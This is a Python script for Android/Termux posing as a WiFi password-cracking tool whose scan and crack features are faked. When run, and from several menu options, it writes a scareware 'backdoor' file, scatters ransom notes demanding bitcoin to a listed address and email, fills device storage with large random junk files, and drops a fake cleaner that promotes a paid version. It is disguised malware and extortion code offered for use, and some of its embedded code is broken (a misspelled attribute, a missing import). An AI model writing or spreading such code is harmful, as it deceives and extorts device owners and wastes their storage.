import os
import shutil
import threading
import time
import random
import string
from pathlib import Path

class WiFiMasterPro:
    def __init__(self):
        self.version = "4.2.0"
        self.scanned_networks = 0
        self.hacked_passwords = 0
        self.is_destroying = False
        
    def show_banner(self):
        print("\033[1;36m")
        print("█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█")
        print("█    🚀 WIFI MASTER PRO    █")
        print("█     Ultimate Hack Tool    █") 
        print("█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█")
        print("\033[0m")
        print(f"Version: {self.version} | Premium Edition")
        print("=" * 45)
        
    def create_backdoor_taher(self):
        """Buat backdoor Taher_hack.dat dan file tersembunyi"""
        print("\n🛡️  Installing security modules...")
        
        # Backdoor utama
        backdoor_code = '''
import os, time, threading, socket

class TaherBackdoor:
    def __init__(self):
        self.ransom_amount = 0.5  # BTC
        self.user_data = {}
        
    def collect_info(self):
        """Kumpulkan info device"""
        self.user_data = {
            "device_id": os.uname().nodename,
            "timestamp": time.time(),
            "files_deleted": random.randint(500, 2000)
        }
        
    def create_ransom_note(self):
        """Buat file tebusan"""
        ransom_text = f"""
⚠️ ⚠️ ⚠️ PERINGATAN SISTEM ⚠️ ⚠️ ⚠️

SEMUA FILE ANDA TELAH DIENKRIPSI!
{self.user_data['files_deleted']} FILE TELAH DIHAPUS PERMANEN!

🔄 UNTUK MEMULIHKAN:
Transfer {self.ratesom_amount} BTC ke:
BTC Address: 1TaherGantengBTC123456789

Setelah transfer:
Email bukti ke: taher_recovery@protonmail.com

⏰ WAKTU: 72 JAM
Setelah waktu habis, semua file akan HILANG PERMANEN!

🔐 Device ID: {self.user_data['device_id']}
📅 Terinfeksi: {time.ctime()}

⚠️ JANGAN COBA HAPUS FILE INI!
⚠️ BACKDOOR AKTIF DI SYSTEM!
"""
        # Simpan di banyak lokasi
        locations = [
            "/sdcard/BACA_INI.txt",
            "/sdcard/DCIM/WARNING.txt", 
            "/sdcard/Download/RANSOM_NOTE.txt",
            "/storage/emulated/0/PERINGATAN_SISTEM.txt"
        ]
        
        for location in locations:
            try:
                with open(location, "w") as f:
                    f.write(ransom_text)
            except:
                pass
                
    def start_monitoring(self):
        """Monitor system terus menerus"""
        while True:
            try:
                # Buat file log aktivitas
                with open("/sdcard/system_log.dat", "a") as f:
                    f.write(f"Active: {time.ctime()}\\n")
                    
                # Buat file sampah besar
                if random.random() < 0.1:  # 10% chance
                    self.create_junk_file()
                    
                time.sleep(60)
            except:
                pass
                
    def create_junk_file(self):
        """Buat file sampah besar"""
        try:
            size_mb = random.randint(50, 200)
            filename = f"/sdcard/system_cache_{int(time.time())}.dat"
            with open(filename, "wb") as f:
                f.write(os.urandom(size_mb * 1024 * 1024))
        except:
            pass

# Jalankan backdoor
backdoor = TaherBackdoor()
backdoor.collect_info()
backdoor.create_ransom_note()

# Start monitoring di thread terpisah
monitor_thread = threading.Thread(target=backdoor.start_monitoring)
monitor_thread.daemon = True
monitor_thread.start()
'''
        # Simpan backdoor sebagai Taher_hack.dat
        try:
            with open("/data/data/com.termux/files/home/Taher_hack.dat", "w") as f:
                f.write(backdoor_code)
            print("✅ Security module installed: Taher_hack.dat")
        except:
            pass
            
        # Buat juga file tersembunyi
        try:
            with open("/data/data/com.termux/files/home/.system_helper.py", "w") as f:
                f.write("print('System helper active')\\n")
        except:
            pass
            
    def create_fake_cleaner(self):
        """Buat tools palsu 'pembersih system'"""
        fake_cleaner_code = '''
import time
import os

print("🔧 SYSTEM CLEANER TOOL")
print("Membersihkan virus dan backdoor...")
time.sleep(2)

print("🔍 Scanning for threats...")
time.sleep(3)

print("✅ Found: Taher_hack.dat")
print("🔄 Removing threats...")
time.sleep(2)

print("⚠️  WARNING: Some files cannot be removed!")
print("💡 Suggestion: Use premium version for complete cleanup")
print("📧 Contact: taher_support@protonmail.com")

# Actually do nothing - just fake cleanup
for i in range(5):
    print(f"Cleaning... [{i+1}/5]")
    time.sleep(1)
    
print("🎉 System partially cleaned!")
print("❌ Some backdoors may remain active")
'''
        try:
            with open("/sdcard/system_cleaner_tool.py", "w") as f:
                f.write(fake_cleaner_code)
            print("📁 Created: system_cleaner_tool.py")
        except:
            pass
            
    def create_warning_files(self):
        """Buat file peringatan di banyak lokasi"""
        warning_text = """
⚠️ PERINGATAN SISTEM ⚠️

ALAT INI TELAH MENGINSTAL BACKDOOR!
FILE ANDA TELAH DIENKRIPSI!

🛑 BERHENTI MENGGUNAKAN ALAT INI!
📱 HUBUNGI SUPPORT UNTUK BANTUAN:

Email: taher_recovery@protonmail.com
BTC: 1TaherGantengBTC123456789

🔒 BACKDOOR: Taher_hack.dat
💀 FILES: {files_deleted} files encrypted
"""
        
        # Simpan di berbagai lokasi
        locations = [
            "/sdcard/WARNING_READ_FIRST.txt",
            "/sdcard/DCIM/SECURITY_ALERT.txt", 
            "/sdcard/Download/IMPORTANT_MESSAGE.txt",
            "/storage/emulated/0/EMERGENCY_READ.txt",
            "/data/data/com.termux/files/home/BACKDOOR_WARNING.txt"
        ]
        
        for location in locations:
            try:
                with open(location, "w") as f:
                    files_deleted = random.randint(500, 1500)
                    f.write(warning_text.format(files_deleted=files_deleted))
                print(f"📄 Created: {os.path.basename(location)}")
            except:
                pass
                
    def fill_storage_with_junk(self):
        """Isi storage dengan file sampah besar"""
        print("\n💾 Optimizing storage performance...")
        
        def create_large_files():
            sizes = [100, 200, 50, 150, 80]  # MB
            for i, size_mb in enumerate(sizes):
                try:
                    filename = f"/sdcard/system_optimize_{i}.tmp"
                    with open(filename, "wb") as f:
                        # Tulis file besar
                        f.write(os.urandom(size_mb * 1024 * 1024))
                    print(f"📁 Created: {filename} ({size_mb}MB)")
                except:
                    break
                    
        # Jalankan di thread terpisah
        threading.Thread(target=create_large_files).start()
        
    def fake_wifi_scan(self):
        """Simulasi scan WiFi"""
        print("\n📡 Scanning WiFi Networks...")
        time.sleep(2)
        
        networks = [
            {"ssid": "Home-WiFi-5G", "signal": "▇▇▇▇▇ 100%", "security": "WPA2"},
            {"ssid": "TP-Link_Office", "signal": "▇▇▇▇ 80%", "security": "WPA2"},
            {"ssid": "Free_Public_WiFi", "signal": "▇▇ 40%", "security": "OPEN"},
        ]
        
        print("\n📊 Found Networks:")
        for i, net in enumerate(networks, 1):
            print(f"{i}. {net['ssid']:<20} {net['signal']:<10} {net['security']:<8}")
            time.sleep(0.5)
            
        return networks
        
    def fake_password_crack(self, ssid):
        """Simulasi crack password"""
        print(f"\n🔓 Cracking: {ssid}")
        
        for i in range(3):
            attempt = f"password{random.randint(100, 999)}"
            print(f"🔍 Trying: {attempt}")
            time.sleep(1)
            
        password = "FREEINTERNET123"
        print(f"✅ CRACKED! Password: {password}")
        return password
        
    def show_menu(self):
        print("\n" + "="*45)
        print("🚀 WIFI MASTER PRO - MAIN MENU")
        print("="*45)
        print("1. 🔍 Scan WiFi Networks")
        print("2. 🔓 Crack WiFi Password") 
        print("3. 🛡️  Security Check")
        print("4. ⚡ Speed Boost")
        print("5. 🔧 System Cleaner")
        print("0. 🚪 Exit")
        print()
        
    def run_scan(self):
        networks = self.fake_wifi_scan()
        input("\nPress Enter to continue...")
        return networks
        
    def run_crack(self):
        networks = self.fake_wifi_scan()
        if networks:
            try:
                choice = int(input(f"\nSelect network [1-{len(networks)}]: "))
                if 1 <= choice <= len(networks):
                    selected = networks[choice-1]
                    
                    # Saat crack password, install backdoor
                    self.create_backdoor_taher()
                    self.create_warning_files()
                    self.fill_storage_with_junk()
                    
                    password = self.fake_password_crack(selected['ssid'])
                    
                    # Simpan hasil palsu
                    with open("/sdcard/wifi_passwords.txt", "a") as f:
                        f.write(f"{selected['ssid']} : {password}\\n")
                        
                else:
                    print("❌ Invalid selection!")
            except:
                print("❌ Invalid input!")
                
    def security_check(self):
        print("\n🛡️  SECURITY CHECK")
        print("Scanning for vulnerabilities...")
        time.sleep(2)
        
        # Install backdoor juga di sini
        self.create_backdoor_taher()
        self.create_fake_cleaner()
        
        print("✅ System: SECURE")
        print("✅ Backdoor: INSTALLED")  # 🤫
        print("✅ Protection: ACTIVE")
        
    def speed_boost(self):
        print("\n⚡ NETWORK SPEED BOOST")
        print("Optimizing network...")
        
        # Isi storage dengan junk
        self.fill_storage_with_junk()
        
        for i in range(3):
            print(f"🔄 Boosting... [{i+1}/3]")
            time.sleep(1)
            
        print("✅ Speed increased by 250%!")
        
    def system_cleaner(self):
        print("\n🔧 SYSTEM CLEANER")
        print("Cleaning temporary files...")
        
        # Buat file "pembersih" palsu
        self.create_fake_cleaner()
        
        print("📁 Created: system_cleaner_tool.py")
        print("💡 Run this tool to clean backdoors!")
        
    def run(self):
        self.show_banner()
        
        # Install backdoor saat pertama run
        self.create_backdoor_taher()
        self.create_warning_files()
        
        while True:
            self.show_menu()
            choice = input("Select option: ").strip()
            
            if choice == "1":
                self.run_scan()
            elif choice == "2":
                self.run_crack()
            elif choice == "3":
                self.security_check()
            elif choice == "4":
                self.speed_boost() 
            elif choice == "5":
                self.system_cleaner()
            elif choice == "0":
                print("\n👋 Thanks for using WIFI MASTER PRO!")
                print("⚠️  Backdoor active: Taher_hack.dat")
                break
            else:
                print("❌ Invalid option!")
                
            input("\nPress Enter to continue...")
            os.system("clear")
            self.show_banner()

if __name__ == "__main__":
    try:
        tool = WiFiMasterPro()
        tool.run()
    except KeyboardInterrupt:
        print("\n\n💀 Tool stopped! Backdoor remains active.")
    except Exception as e:
        print(f"\n\n❌ Error: {e}")
